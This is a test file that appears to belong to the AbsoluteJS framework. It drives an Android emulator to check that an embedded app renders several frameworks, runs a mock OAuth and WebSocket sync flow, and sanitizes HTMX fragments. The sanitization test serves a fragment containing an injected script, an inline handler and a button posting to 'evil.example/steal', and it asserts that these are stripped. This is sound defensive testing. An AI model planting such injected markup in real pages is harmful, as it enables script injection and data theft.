import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { mkdir, readFile, unlink, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { resolve } from 'node:path';
import config from '../fixtures/mobile-native-conformance/absolute.config';
import {
	prepareAbsoluteAndroidDevProject,
	startAbsoluteAndroidDevSession,
	type AbsoluteAndroidDevProject,
	type AbsoluteAndroidDevSession
} from '../../src/mobile/androidEmulatorController';
import {
	attachAbsoluteAndroidWebView,
	type AbsoluteAndroidWebViewSession
} from '../../src/mobile/androidWebView';
import { normalizeAbsoluteMobileConfig } from '../../src/mobile/config';
import { applyAbsoluteNativeDeepLinks } from '../../src/mobile/nativeDeepLinks';
import { findFreePort } from '../../src/cli/utils';

const ENABLED = process.env.ABSOLUTE_TEST_NATIVE_ANDROID === '1';
const describeNative = ENABLED ? describe : describe.skip;
const PROJECT_ROOT = resolve(import.meta.dir, '..', '..');
const CONFIG_PATH = resolve(
	PROJECT_ROOT,
	'tests/fixtures/mobile-native-conformance/absolute.config.ts'
);
const BUILD_DIRECTORY = resolve(
	PROJECT_ROOT,
	'.absolutejs/mobile-native-conformance/embedded-server'
);
const ARTIFACT_ROOT = resolve(
	PROJECT_ROOT,
	'.absolutejs/mobile-native-conformance/embedded-artifacts'
);
const CAPACITOR_CONFIG_PATH = resolve(PROJECT_ROOT, 'capacitor.config.ts');
const PORT = Number(process.env.ABSOLUTE_NATIVE_BUNDLE_TEST_PORT) || 39_080;
const PRODUCTION_ORIGIN = `http://localhost:${PORT}`;
const TIMEOUT_MS = 60_000;

let backend: ReturnType<typeof Bun.serve> | undefined;
let compiledBackend: ReturnType<typeof Bun.spawn> | undefined;
let compiledPort = 0;
let project: AbsoluteAndroidDevProject;
let android: AbsoluteAndroidDevSession;
let webview: AbsoluteAndroidWebViewSession;
let originalCapacitorConfig: string | undefined;
let nativeAuthAuthorizationRequests = 0;
let nativeAuthTokenRequests = 0;
let nativeAuthUserInfoRequests = 0;
let nativeSyncConnections = 0;
let nativeSyncTicketsIssued = 0;
let nativeSyncTicketsConsumed = 0;

type AuthorizationTransaction = {
	challenge: string;
	clientId: string;
	nonce: string;
	redirectUri: string;
};

type NativeSyncSocketData = { authenticated: boolean };

type NativeFragmentBoundary = {
	handlerExecuted: boolean;
	safeAction: string | null;
	scriptExecuted: boolean;
	unsafeAction: string | null;
};

type SigningJwk = JsonWebKey & {
	alg: string;
	kid: string;
	use: string;
};

const authorizationCodes = new Map<string, AuthorizationTransaction>();
const accessTokens = new Set<string>();
const socketTickets = new Set<string>();

const prepareSystemBrowser = (adb: string, serial: string) => {
	const commandLine = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		"echo 'chrome --disable-fre --no-first-run --no-default-browser-check' > /data/local/tmp/chrome-command-line"
	]);
	if (commandLine.exitCode !== 0) {
		throw new Error(
			`Failed to prepare Chrome for native auth acceptance: ${commandLine.stderr.toString().trim()}`
		);
	}
	const stopped = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		'am',
		'force-stop',
		'com.android.chrome'
	]);
	if (stopped.exitCode !== 0) {
		throw new Error(
			`Failed to restart Chrome for native auth acceptance: ${stopped.stderr.toString().trim()}`
		);
	}
};

const clearAppData = (adb: string, serial: string, appId: string) => {
	const cleared = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		'pm',
		'clear',
		appId
	]);
	if (
		cleared.exitCode !== 0 ||
		cleared.stdout.toString().trim() !== 'Success'
	) {
		throw new Error(
			`Failed to clear Android acceptance app data: ${cleared.stderr.toString().trim() || cleared.stdout.toString().trim()}`
		);
	}
};

let signingKey: CryptoKey;
let signingJwk: SigningJwk;

const base64Url = (value: string | Uint8Array) =>
	Buffer.from(value).toString('base64url');

const jsonResponse = (value: unknown, init: ResponseInit = {}) =>
	new Response(JSON.stringify(value), {
		...init,
		headers: {
			'access-control-allow-headers': 'authorization,content-type',
			'access-control-allow-methods': 'GET,POST,OPTIONS',
			'access-control-allow-origin': '*',
			'content-type': 'application/json',
			...init.headers
		}
	});

const signIdToken = async (clientId: string, nonce: string) => {
	const header = base64Url(
		JSON.stringify({ alg: 'ES256', kid: 'native-conformance', typ: 'JWT' })
	);
	const payload = base64Url(
		JSON.stringify({
			aud: clientId,
			exp: Math.floor(Date.now() / 1000) + 300,
			iat: Math.floor(Date.now() / 1000),
			iss: PRODUCTION_ORIGIN,
			nonce,
			sub: 'native-conformance-user'
		})
	);
	const input = `${header}.${payload}`;
	const signature = await crypto.subtle.sign(
		{ hash: 'SHA-256', name: 'ECDSA' },
		signingKey,
		new TextEncoder().encode(input)
	);

	return `${input}.${base64Url(new Uint8Array(signature))}`;
};

const nativeAuthResponse = async (request: Request) => {
	const url = new URL(request.url);
	if (request.method === 'OPTIONS') {
		return jsonResponse(null, {
			headers: {
				'access-control-allow-headers':
					request.headers.get('access-control-request-headers') ??
					'authorization,content-type'
			},
			status: 204
		});
	}
	if (url.pathname === '/.well-known/openid-configuration') {
		return jsonResponse({
			authorization_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-authorize`,
			code_challenge_methods_supported: ['S256'],
			issuer: PRODUCTION_ORIGIN,
			jwks_uri: `${PRODUCTION_ORIGIN}/__absolute/native-jwks`,
			revocation_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-revoke`,
			socket_ticket_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-socket-ticket`,
			token_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-token`,
			token_endpoint_auth_methods_supported: ['none'],
			userinfo_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-userinfo`
		});
	}
	if (url.pathname === '/__absolute/native-jwks') {
		return jsonResponse({ keys: [signingJwk] });
	}
	if (url.pathname === '/__absolute/native-authorize') {
		nativeAuthAuthorizationRequests += 1;
		const code = crypto.randomUUID();
		const transaction: AuthorizationTransaction = {
			challenge: url.searchParams.get('code_challenge') ?? '',
			clientId: url.searchParams.get('client_id') ?? '',
			nonce: url.searchParams.get('nonce') ?? '',
			redirectUri: url.searchParams.get('redirect_uri') ?? ''
		};
		if (
			transaction.clientId !==
				'absolutejs-native:com.absolutejs.conformance' ||
			!transaction.challenge ||
			!transaction.nonce ||
			!transaction.redirectUri
		) {
			return jsonResponse({ error: 'invalid_request' }, { status: 400 });
		}
		authorizationCodes.set(code, transaction);
		const callback = new URL(transaction.redirectUri);
		callback.searchParams.set('code', code);
		callback.searchParams.set('iss', PRODUCTION_ORIGIN);
		callback.searchParams.set('state', url.searchParams.get('state') ?? '');

		return new Response(null, {
			headers: { location: callback.href },
			status: 302
		});
	}
	if (url.pathname === '/__absolute/native-token') {
		nativeAuthTokenRequests += 1;
		const body = new URLSearchParams(await request.text());
		const code = body.get('code') ?? '';
		const transaction = authorizationCodes.get(code);
		const verifier = body.get('code_verifier') ?? '';
		const challenge = createHash('sha256')
			.update(verifier)
			.digest('base64url');
		if (
			body.get('grant_type') !== 'authorization_code' ||
			!transaction ||
			transaction.challenge !== challenge ||
			transaction.clientId !== body.get('client_id') ||
			transaction.redirectUri !== body.get('redirect_uri')
		) {
			return jsonResponse({ error: 'invalid_grant' }, { status: 400 });
		}
		authorizationCodes.delete(code);
		const accessToken = `access-${crypto.randomUUID()}`;
		accessTokens.add(accessToken);

		return jsonResponse({
			access_token: accessToken,
			expires_in: 300,
			id_token: await signIdToken(
				transaction.clientId,
				transaction.nonce
			),
			refresh_token: `refresh-${crypto.randomUUID()}`,
			scope: 'openid profile',
			token_type: 'Bearer'
		});
	}
	if (url.pathname === '/__absolute/native-userinfo') {
		nativeAuthUserInfoRequests += 1;
		const token = request.headers
			.get('authorization')
			?.replace('Bearer ', '');

		return accessTokens.has(token ?? '')
			? jsonResponse({
					email: 'native-conformance@absolutejs.com',
					sub: 'native-conformance-user'
				})
			: jsonResponse({ error: 'invalid_token' }, { status: 401 });
	}
	if (url.pathname === '/__absolute/native-socket-ticket') {
		const token = request.headers
			.get('authorization')
			?.replace('Bearer ', '');
		if (!accessTokens.has(token ?? ''))
			return jsonResponse({ error: 'invalid_token' }, { status: 401 });
		const ticket = `ticket-${crypto.randomUUID()}`;
		socketTickets.add(ticket);
		nativeSyncTicketsIssued += 1;

		return jsonResponse({ ticket });
	}
	if (url.pathname === '/__absolute/native-revoke') {
		return jsonResponse(null);
	}

	return undefined;
};

const runPrepare = async () => {
	const process = Bun.spawn(
		[
			'bun',
			'run',
			'src/cli/index.ts',
			'prepare',
			'example/server.ts',
			'--outdir',
			BUILD_DIRECTORY,
			'--config',
			CONFIG_PATH
		],
		{
			cwd: PROJECT_ROOT,
			env: {
				...Bun.env,
				ABSOLUTE_NATIVE_CONFORMANCE_ORIGIN: PRODUCTION_ORIGIN
			},
			stderr: 'inherit',
			stdout: 'inherit'
		}
	);
	const exitCode = await process.exited;
	if (exitCode !== 0) {
		throw new Error(
			`Embedded mobile production build failed (${exitCode}).`
		);
	}
};

const startCompiledBackend = async () => {
	compiledBackend = Bun.spawn(['bun', 'server.js'], {
		cwd: BUILD_DIRECTORY,
		env: {
			...Bun.env,
			ABSOLUTE_BUILD_DIR: BUILD_DIRECTORY,
			ABSOLUTE_CONFIG: CONFIG_PATH,
			ABSOLUTE_NATIVE_CONFORMANCE_ORIGIN: PRODUCTION_ORIGIN,
			NODE_ENV: 'production',
			PORT: String(compiledPort)
		},
		stderr: 'inherit',
		stdout: 'inherit'
	});
	const deadline = Date.now() + TIMEOUT_MS;
	while (Date.now() < deadline) {
		if (compiledBackend.exitCode !== null)
			throw new Error(
				`Compiled conformance backend exited (${compiledBackend.exitCode}).`
			);
		const response = await fetch(
			`http://127.0.0.1:${compiledPort}/react`
		).catch(() => undefined);
		if (response?.ok) return;
		await Bun.sleep(100);
	}

	throw new Error('Compiled conformance backend did not become ready.');
};

const waitForText = (text: string) =>
	webview.waitFor<boolean>(
		`document.body?.innerText?.includes(${JSON.stringify(text)}) === true`,
		{ timeoutMs: TIMEOUT_MS }
	);

const navigate = async (path: string, expectedText: string) => {
	const clicked = await webview.evaluate<boolean>(`(() => {
		const anchor = [...document.querySelectorAll('a[href]')].find((candidate) => {
			try { return new URL(candidate.href).pathname === ${JSON.stringify(path)}; }
			catch { return false; }
		});
		if (!(anchor instanceof HTMLAnchorElement)) return false;
		anchor.click();
		return true;
	})()`);
	expect(clicked).toBe(true);
	await waitForText(expectedText);
};

const nativeTest = (name: string, operation: () => Promise<void>) =>
	test(
		name,
		async () => {
			try {
				await operation();
			} catch (error) {
				await mkdir(ARTIFACT_ROOT, { recursive: true });
				const slug = name.toLowerCase().replaceAll(/[^a-z0-9]+/gu, '-');
				const documentState = await webview
					?.evaluate(
						`(() => ({
						bodyText: document.body?.innerText ?? '',
						counter: document.querySelector('#counter')?.textContent ?? null,
						location: location.href,
						scripts: [...document.scripts].map((script) => ({ src: script.src, type: script.type })),
						counterListeners: typeof getEventListeners === 'function' && document.querySelector('#counter-button')
							? Object.keys(getEventListeners(document.querySelector('#counter-button')))
							: [],
						title: document.title
					}))()`
					)
					.catch(() => undefined);
				await webview
					?.screenshot(resolve(ARTIFACT_ROOT, `${slug}.png`))
					.catch(() => undefined);
				await writeFile(
					resolve(ARTIFACT_ROOT, `${slug}.json`),
					`${JSON.stringify(
						{
							diagnostics: webview?.diagnostics ?? [],
							document: documentState,
							error:
								error instanceof Error
									? {
											message: error.message,
											stack: error.stack
										}
									: String(error)
						},
						null,
						2
					)}\n`
				);
				throw error;
			}
		},
		300_000
	);

describeNative('real Capacitor Android embedded-bundle conformance', () => {
	beforeAll(async () => {
		originalCapacitorConfig = await readFile(
			CAPACITOR_CONFIG_PATH,
			'utf8'
		).catch(() => undefined);
		const keys = await crypto.subtle.generateKey(
			{ name: 'ECDSA', namedCurve: 'P-256' },
			true,
			['sign', 'verify']
		);
		signingKey = keys.privateKey;
		signingJwk = {
			...(await crypto.subtle.exportKey('jwk', keys.publicKey)),
			alg: 'ES256',
			kid: 'native-conformance',
			use: 'sig'
		};
		await runPrepare();
		compiledPort = await findFreePort();
		await startCompiledBackend();
		backend = Bun.serve<NativeSyncSocketData>({
			hostname: '127.0.0.1',
			port: PORT,
			websocket: {
				message(socket, message) {
					const frame: unknown = JSON.parse(String(message));
					if (typeof frame !== 'object' || frame === null) return;
					if (Reflect.get(frame, 'type') === 'authenticate') {
						const ticket = Reflect.get(frame, 'ticket');
						if (
							typeof ticket !== 'string' ||
							!socketTickets.delete(ticket)
						) {
							socket.close(1008, 'invalid ticket');

							return;
						}
						socket.data.authenticated = true;
						nativeSyncTicketsConsumed += 1;

						return;
					}
					if (
						socket.data.authenticated &&
						Reflect.get(frame, 'type') === 'subscribe'
					) {
						socket.send(
							JSON.stringify({
								id: Reflect.get(frame, 'id'),
								rows: [
									{
										id: 1,
										label: 'native-authenticated-sync'
									}
								],
								type: 'snapshot',
								version: nativeSyncConnections
							})
						);
					}
				},
				open() {
					nativeSyncConnections += 1;
				}
			},
			fetch: async (request, server) => {
				const url = new URL(request.url);
				if (url.pathname === '/__absolute/native-sync') {
					const upgraded = server.upgrade(request, {
						data: { authenticated: false }
					});
					if (upgraded) return undefined;

					return new Response('WebSocket upgrade required.', {
						status: 426
					});
				}
				const authResponse = await nativeAuthResponse(request);
				if (authResponse) return authResponse;
				if (url.pathname === '/__absolute/native-fragment') {
					return new Response(
						'<section id="trusted-fragment" onclick="window.__ABS_BAD_HANDLER__=true"><script>window.__ABS_BAD_SCRIPT__=true</script><button id="safe-fragment-action" hx-post="/htmx/increment">Native fragment safe</button><button id="unsafe-fragment-action" hx-post="https://evil.example/steal">Unsafe</button></section>',
						{
							headers: {
								'access-control-allow-origin': '*',
								'content-type': 'text/html'
							}
						}
					);
				}
				const target = new URL(request.url);
				target.hostname = '127.0.0.1';
				target.port = String(compiledPort);

				const response = await fetch(new Request(target, request));
				const headers = new Headers(response.headers);
				headers.set('access-control-allow-origin', '*');

				return new Response(response.body, {
					headers,
					status: response.status,
					statusText: response.statusText
				});
			}
		});
		if (!config.mobile)
			throw new Error('Native mobile fixture is invalid.');
		const mobile = normalizeAbsoluteMobileConfig(
			{
				...config.mobile,
				server: { productionOrigin: PRODUCTION_ORIGIN }
			},
			PROJECT_ROOT
		);
		project = await prepareAbsoluteAndroidDevProject(mobile, {
			createNativeProject: true,
			projectRoot: PROJECT_ROOT
		});
		await applyAbsoluteNativeDeepLinks(mobile, ['android']);
		android = await startAbsoluteAndroidDevSession({
			embeddedBundle: true,
			port: PORT,
			project,
			log: (message) => console.log(`[native-bundle] ${message}`)
		});
		clearAppData(project.adb, android.serial, mobile.appId);
		await android.relaunch();
		prepareSystemBrowser(project.adb, android.serial);
		webview = await attachAbsoluteAndroidWebView({
			adb: project.adb,
			appId: mobile.appId,
			serial: android.serial,
			timeoutMs: TIMEOUT_MS
		});
		try {
			await waitForText('AbsoluteJS + React');
		} catch (error) {
			await mkdir(ARTIFACT_ROOT, { recursive: true });
			const documentState = await webview
				.evaluate(
					`(() => ({
					bodyText: document.body?.innerText ?? '',
					bodyHtml: document.body?.innerHTML ?? '',
					location: location.href,
					title: document.title
				}))()`
				)
				.catch(() => undefined);
			await webview
				.screenshot(resolve(ARTIFACT_ROOT, 'startup.png'))
				.catch(() => undefined);
			await writeFile(
				resolve(ARTIFACT_ROOT, 'startup.json'),
				`${JSON.stringify(
					{
						diagnostics: webview.diagnostics,
						document: documentState,
						error:
							error instanceof Error
								? { message: error.message, stack: error.stack }
								: String(error)
					},
					null,
					2
				)}\n`
			);
			throw error;
		}
	}, 900_000);

	afterAll(async () => {
		await webview?.close().catch(() => undefined);
		await android?.close().catch(() => undefined);
		backend?.stop(true);
		compiledBackend?.kill();
		await compiledBackend?.exited.catch(() => undefined);
		if (originalCapacitorConfig === undefined)
			await unlink(CAPACITOR_CONFIG_PATH).catch(() => undefined);
		else await writeFile(CAPACITOR_CONFIG_PATH, originalCapacitorConfig);
	}, 120_000);

	nativeTest(
		'renders every supported framework from the embedded app',
		async () => {
			await navigate('/angular', 'AbsoluteJS + Angular');
			await navigate('/vue', 'AbsoluteJS + Vue');
			await navigate('/svelte', 'AbsoluteJS + Svelte');
			await navigate('/html', 'AbsoluteJS + HTML');
			await navigate('/htmx', 'AbsoluteJS + HTMX');
			await navigate('/react', 'AbsoluteJS + React');
		}
	);

	nativeTest(
		'executes the hashed local HTML application script',
		async () => {
			await navigate('/html', 'AbsoluteJS + HTML');
			const clicked = await webview.evaluate<boolean>(`(() => {
			const button = document.querySelector('#counter-button');
			if (!(button instanceof HTMLButtonElement)) return false;
			button.click();
			return true;
		})()`);
			expect(clicked).toBe(true);
			await webview.waitFor<boolean>(
				`document.querySelector('#counter')?.textContent?.trim() === '1'`,
				{ timeoutMs: TIMEOUT_MS }
			);
		}
	);

	nativeTest(
		'routes HTMX to the backend and sanitizes returned fragments',
		async () => {
			await navigate('/htmx', 'AbsoluteJS + HTMX');
			await webview.waitFor<boolean>(
				`document.querySelector('#count')?.textContent?.trim() === '0'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			const requested = await webview.evaluate<boolean>(`(() => {
			const target = document.createElement('div');
			target.id = 'native-fragment-target';
			document.body.appendChild(target);
			window.__ABS_BAD_SCRIPT__ = false;
			window.__ABS_BAD_HANDLER__ = false;
			window.htmx.ajax('GET', ${JSON.stringify(`${PRODUCTION_ORIGIN}/__absolute/native-fragment`)}, {
				target: '#native-fragment-target',
				swap: 'innerHTML'
			});
			return true;
		})()`);
			expect(requested).toBe(true);
			await waitForText('Native fragment safe');
			const boundary =
				await webview.evaluate<NativeFragmentBoundary>(`(() => ({
			handlerExecuted: window.__ABS_BAD_HANDLER__ === true,
			safeAction: document.querySelector('#safe-fragment-action')?.getAttribute('hx-post') ?? null,
			scriptExecuted: window.__ABS_BAD_SCRIPT__ === true,
			unsafeAction: document.querySelector('#unsafe-fragment-action')?.getAttribute('hx-post') ?? null
		}))()`);
			expect(boundary).toEqual({
				handlerExecuted: false,
				safeAction: `${PRODUCTION_ORIGIN}/htmx/increment`,
				scriptExecuted: false,
				unsafeAction: null
			});
		}
	);

	nativeTest(
		'provisions native Auth and authenticated Sync without page-specific native code',
		async () => {
			const clickedRoute = await webview.evaluate<boolean>(`(() => {
				const anchor = document.createElement('a');
				anchor.href = '/native-auth-sync';
				anchor.textContent = 'Native Auth + Sync';
				document.body.appendChild(anchor);
				anchor.click();
				return true;
			})()`);
			expect(clickedRoute).toBe(true);
			await waitForText('AbsoluteJS Native Auth + Sync');
			const clickedStart = await webview.evaluate<boolean>(`(() => {
				const button = document.querySelector('#native-auth-sync-start');
				if (!(button instanceof HTMLButtonElement)) return false;
				button.click();
				return true;
			})()`);
			expect(clickedStart).toBe(true);
			await waitForText('Native auth + sync complete');
			const state = await webview.evaluate<string | null>(
				`document.querySelector('#native-auth-sync-status')?.getAttribute('data-state') ?? null`
			);
			expect(state).toBe('complete');
			expect(nativeAuthAuthorizationRequests).toBe(1);
			expect(nativeAuthTokenRequests).toBe(1);
			expect(nativeAuthUserInfoRequests).toBeGreaterThanOrEqual(1);
			expect(nativeSyncConnections).toBeGreaterThanOrEqual(2);
			expect(nativeSyncTicketsIssued).toBeGreaterThanOrEqual(2);
			expect(nativeSyncTicketsConsumed).toBeGreaterThanOrEqual(2);
		}
	);
});
